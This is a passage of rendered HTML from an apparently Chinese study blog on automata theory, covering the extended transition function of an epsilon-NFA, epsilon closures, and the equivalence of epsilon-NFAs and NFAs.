class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">ϵ</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5007159999999999em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></p><p>实际上是怎么样呢？首先我们先求一个叫做P的状态集合。</p><p>里面记录的状态都是什么呢？</p><p>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的空串闭包里的状态在输入0转移后的状态们。</p><p>之前求了，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的空串闭包里有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{q_0,q_1,q_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>。它们输入零后，只剩下了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。所以P就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><msub><mi>p</mi><mn>0</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{p_0\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></p><p>然后我们再求这个P的空串闭包就可以啦，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的空串闭包是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{q_0,q_1,q_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>。</p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{q_0,q_1,q_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>啦！</p><p>我们再做一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span>。</p><p>先求P，就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的空串闭包在输入2后的转移状态们，发现只有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>然后就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的空串闭包，很显然<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>后继无人了，它的空串闭包只有自己了。</p><p>故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,2)=\{q_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>。</p><blockquote><p>虽然空串闭包中可能只有一个元素，但是仍然要写成一个集合的形式，因为空串闭包定义的时候就是定义的一个集合。而且这个集合不会是一个空集合，因为任何状态的空串闭包中肯定有自己。</p></blockquote><p>通过以上的例子，我们已经知道了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span></span></span></span>的求法。也能够发现，由于定义的不一样，盖帽转移和转移是完全不一样的结果【从结果中很容易看出来，想象一下求得过程也很容易理解】</p><p><img src="https://upyun.wuuconix.link/image-20211109193711432.png" alt="delta" /></p><p>我们在已经了解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span></span></span></span>在理论上得求法之后，我们再重新审视一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>盖帽到底求的是什么，能不能通过我们朴素的直觉看到它的结果。</p><p><img src="https://upyun.wuuconix.link/image-20211109215953787.png" alt="例子" /></p><h3 id="epsilon-nfa接受的语言"><a class="markdownIt-Anchor" href="#epsilon-nfa接受的语言"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>接受的语言</h3><p><img src="https://upyun.wuuconix.link/image-20211109223700303.png" alt="空串-NFA接收的语言" /></p><h3 id="定理3-2"><a class="markdownIt-Anchor" href="#定理3-2"></a> 定理3-2</h3><p>空串NFA和NFA是等价的。</p><p><img src="https://upyun.wuuconix.link/image-20211109223905584.png" alt="等价" /></p><p>构造起来非常简单，状态转移函数直接不用该，直接搬过去。</p><p>然后对应NFA的终结符号集合可能需要改变。</p><p>如果原本的终结符号集合和开始符号的空船闭包有交集，那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>也需要加入到对应NFA的终结符号集合之后。</p><p>如果没有交集，那么就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>的F啦。</p><h3 id="epsilon-nfa-和-nfa转化的例子"><a class="markdownIt-Anchor" href="#epsilon-nfa-和-nfa转化的例子"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span> 和 NFA转化的例子</h3><p><img src="https://upyun.wuuconix.link/image-20211109224638232.png" alt="例子1" /></p><p><img src="https://upyun.wuuconix.link/image-20211109224708291.png" alt="对应NFA" /></p><h3 id="小总结"><a class="markdownIt-Anchor" href="#小总结"></a> 小总结</h3><p><img src="https://upyun.wuuconix.link/image-20211109224914484.png" alt="转化" /></p><p>在实现一个具体FA的时候，我们可以先写出最简单，最智能，最容易写的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>，然后通过等价转化，转化为我们需要的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>获得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">DFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>。</p><h3 id="定理3-3"><a class="markdownIt-Anchor" href="#定理3-3"></a> 定理3-3</h3><p>FA接收的语言是正则语言。</p><p><img src="https://upyun.wuuconix.link/image-20211109231744670.png" alt="FA接收的语言是正则语言" 